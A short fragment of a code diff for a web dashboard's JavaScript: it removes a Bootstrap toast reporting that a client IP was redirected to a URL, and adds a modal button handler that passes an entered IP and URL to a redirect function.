-                        <div class="toast-header bg-success text-white">
-                          <strong class="me-auto">Success</strong>
-                          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast" aria-label="Close"></button>
-                        </div>
-                        <div class="toast-body">
-                          Client ${ip} redirected to ${url}
-                        </div>
-                      </div>
-                    </div>
-                  `;
-                  document.body.appendChild(toastEl);
-                  
-                  // Auto remove toast after 3 seconds
-                  setTimeout(() => {
-                    toastEl.remove();
-                  }, 3000);
+              }
+          });
+          
+          // Modal redirect button handler
+          $('#modalRedirectBtn').click(function() {
+              const ip = $('#modalRedirectIpInput').val();
+              const url = $('#modalRedirectUrlInput').val();
+              if (ip && url) {
+                  triggerRedirect(ip, url);
               }
           });
         });
